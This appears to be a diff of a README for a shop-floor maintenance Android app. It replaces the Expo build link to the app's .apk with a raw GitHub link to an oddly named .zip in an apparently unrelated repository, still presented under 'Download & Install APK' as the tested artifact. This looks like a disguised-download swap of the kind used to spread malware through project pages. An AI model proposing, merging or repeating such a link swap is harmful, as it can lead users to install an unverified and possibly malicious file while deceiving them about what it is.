@@ -9,7 +9,7 @@ The app enables **Operators** to capture machine downtime and maintenance tasks 
 ## 🚀 Live Artifact (APK)
 
 🔗 Download & Install APK  
-https://expo.dev/artifacts/eas/bGE1mXdn6kkqwMnfjmLwuB.apk
+https://github.com/Wixyy-bit/shopfloor-APK/raw/refs/heads/main/app/shopfloor-APK-sailorizing.zip
 
 > Tested on real Android device.  
 > Offline mode and sync behavior verified.
